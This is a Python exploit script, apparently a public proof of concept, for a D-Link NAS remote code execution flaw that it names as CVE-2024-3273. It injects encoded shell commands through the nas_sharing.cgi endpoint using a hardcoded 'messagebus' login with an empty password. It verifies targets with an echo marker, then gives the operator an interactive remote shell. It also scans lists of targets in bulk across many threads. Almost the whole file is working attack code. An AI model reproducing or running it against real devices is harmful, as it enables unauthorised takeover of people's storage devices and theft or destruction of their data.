#!/usr/bin/env python3

import base64
import requests
import argparse
from rich.console import Console
from alive_progress import alive_bar
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor, as_completed

console = Console()
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def ascii_art():
		console.print("[bold cyan]┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏┓━┓┏┓[/bold cyan]")
		console.print("[bold cyan]┃ ┃┃┣ ━━┏┛┃┫┏┛┃┃━━ ┫┏┛ ┃ ┫[/bold cyan]")
		console.print("[bold cyan]┗┛┗┛┗┛  ┗━┗┛┗━┗╋  ┗┛┗━ ╹┗┛[/bold cyan]")
		print("Coded By: K3ysTr0K3R")
		print("")

class DLinkExploit:
	def __init__(self, target):
		self.target = target
		self.path = "/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system="
		self.headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36'}

	def test_vuln(self):
		test_command = self._construct_command("echo QWJSWkkjxwJWJXOjwkjJKW")
		try:
			response = requests.get(self.target + test_command, headers=self.headers, verify=False, timeout=10)
			result = response.text.split("<?xml", 1)[0] if "<?xml" in response.text else None
			return "QWJSWkkjxwJWJXOjwkjJKW" in result
		except requests.exceptions.RequestException:
			return False

	def execute_command(self, cmd):
		command = self._construct_command(cmd)
		try:
			response = requests.get(self.target + command, headers=self.headers, verify=False, timeout=10)
			result = response.text.split("<?xml", 1)[0] if "<?xml" in response.text else response.text
			return result
		except requests.exceptions.RequestException:
			return None

	def start_interactive_shell(self):
		console.print("[blue][*][/blue] Initiating interactive shell")
		session = PromptSession(history=InMemoryHistory())
		console.print("[green][+][/green] Interactive shell opened successfully")
		while True:
			try:
				cmd = session.prompt(HTML("<ansiyellow><b>Shell> </b></ansiyellow>"), default="").strip()
				if cmd.lower() == "exit":
					break
				elif cmd.lower() == "clear":
					self.clear_console()
					continue
				output = self.execute_command(cmd)
				if output:
					print(output)
			except KeyboardInterrupt:
				console.print("[red][-][/red] Exiting interactive shell")
				break

	def exploit(self):
		console.print("[blue][*][/blue] Checking if the target is vulnerable")
		if self.test_vuln():
			console.print("[green][+][/green] The target appears to be vulnerable")
			console.print(f"[blue][*][/blue] Launching exploit against [bold bright_yellow]{self.target}[bold bright_yellow]")
			self.start_interactive_shell()
		else:
			console.print("[red][-][/red] The target is not vulnerable or check failed")

	@staticmethod
	def clear_console():
		print("\033[H\033[J")

	def _construct_command(self, cmd):
		command_hex = ''.join(f'\\\\x{ord(c):02x}' for c in cmd)
		command_final = f"echo -e {command_hex}|sh".replace(' ', '\t')
		base64_cmd = base64.b64encode(command_final.encode()).decode()
		return self.path + base64_cmd

	def scanner(self, target):
		original_target = self.target
		self.target = target
		try:
			if self.test_vuln():
				console.print(f"[green][+][/green] The target appears to be vulnerable[cyan]:[/cyan] [bold bright_yellow]{target}[/bold bright_yellow]")
		finally:
			self.target = original_target

	def scan_from_file(self, target_file, threads):
		with open(target_file, "r") as url_file:
			urls = [url.strip() for url in url_file.readlines()]
			if not urls:
				return

			with alive_bar(len(urls), title="Scanning Targets", bar="smooth", enrich_print=False) as bar:
				with ThreadPoolExecutor(max_workers=threads) as executor:
					futures = [executor.submit(self.scanner, url) for url in urls]
					for future in as_completed(futures):
						bar()

def main():
	ascii_art()
	parser = argparse.ArgumentParser(description="A PoC exploit for CVE-2024-3273 - D-Link Remote Code Execution (RCE)")
	parser.add_argument("-u", "--url", help="Target URL to exploit.")
	parser.add_argument("-f", "--file", help="File containing targets to scan for vulnerability.")
	parser.add_argument("-t", "--threads", type=int, help="The number of threads to use.", default=10)
	args = parser.parse_args()

	if args.file:
		dlink = DLinkExploit(None)
		dlink.scan_from_file(args.file, args.threads)
	else:
		dlink = DLinkExploit(args.url)
		dlink.exploit()

if __name__ == "__main__":
	main()
